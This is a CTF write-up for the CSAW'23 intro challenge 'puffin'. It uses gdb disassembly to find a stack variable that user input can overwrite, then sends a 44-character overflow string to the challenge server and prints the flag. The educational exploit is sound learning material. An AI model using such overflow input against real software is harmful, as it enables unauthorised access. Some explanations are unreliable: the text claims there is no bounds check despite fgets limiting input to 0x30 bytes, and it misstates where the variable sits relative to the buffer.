# CSAW'23

## puffin

> 
> Huff, puff, and blow that buffer over.
>
>  Author: ElykDeer
>
> [`readme.txt`](readme.txt), [`puffin`](puffin)

Tags: _intro_

## Solution
Right, again a binary and some instructions. This time to run the binary with a debugger. So lets fire up `gdb`.

```bash
$ gdb ./puffin
pwndbg> break main
Breakpoint 1 at 0x82e
pwndbg> r
```

We can step through the code by pressing `s` (step into) or `n` (next). After some typical `pwn` setup the program prints something...

```bash
0x55555540089f <main+117>    call   printf@plt                <printf@plt>
format: 0x555555400974 ◂— 'The penguins are watching: '
vararg: 0x1
```

Afterwards the user needs to input something and then the variable on stack [rbp-4] is tested to be 0. 

```bash
0x5555554008b7 <main+141>    call   fgets@plt                <fgets@plt>
s: 0x7fffffffde20 ◂— 0x0
n: 0x30
stream: 0x7ffff7f9aa80 (_IO_2_1_stdin_) ◂— 0xfbad208b

0x5555554008bc <main+146>    cmp    dword ptr [rbp - 4], 0
0x5555554008c0 <main+150>    je     main+166                <main+166>
```

If we look at the whole sequence in the disassembly we can see that there is a interesting looking call to `system` if [rbp-4] is not zero. But since we cannot change the value of the variable the system call is never reached. Or can't we?

```c
0x000055555540089f <+117>:   call   0x5555554006d0 <printf@plt>
0x00005555554008a4 <+122>:   mov    rdx,QWORD PTR [rip+0x200775]        # 0x555555601020 <stdin@@GLIBC_2.2.5>
0x00005555554008ab <+129>:   lea    rax,[rbp-0x30]
0x00005555554008af <+133>:   mov    esi,0x30
0x00005555554008b4 <+138>:   mov    rdi,rax
0x00005555554008b7 <+141>:   call   0x5555554006e0 <fgets@plt>
=> 0x00005555554008bc <+146>:   cmp    DWORD PTR [rbp-0x4],0x0
0x00005555554008c0 <+150>:   je     0x5555554008d0 <main+166>
0x00005555554008c2 <+152>:   lea    rdi,[rip+0xc7]        # 0x555555400990
0x00005555554008c9 <+159>:   call   0x5555554006c0 <system@plt>
0x00005555554008ce <+164>:   jmp    0x5555554008dc <main+178>
0x00005555554008d0 <+166>:   lea    rdi,[rip+0xc7]        # 0x55555540099e
0x00005555554008d7 <+173>:   call   0x5555554006b0 <puts@plt>
0x00005555554008dc <+178>:   mov    eax,0x0
0x00005555554008e1 <+183>:   leave
0x00005555554008e2 <+184>:   ret
```

The user input before is written to [rbp-0x30] and has no bounds  check. Since [rbp-4] is logically before our buffer we can write over the buffer bounds and change the variable at [rbp-4] as well. Perfect, our buffer is `43` bytes long, so we need to send at least `44` characters to override the variable. Lets test this:

```bash
$ nc intro.csaw.io 31140
The penguins are watching: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
csawctf{m4ybe_i_sh0u1dve_co113c73d_mor3_rock5_7o_impr355_her....}
```

Flag `csawctf{m4ybe_i_sh0u1dve_co113c73d_mor3_rock5_7o_impr355_her....}`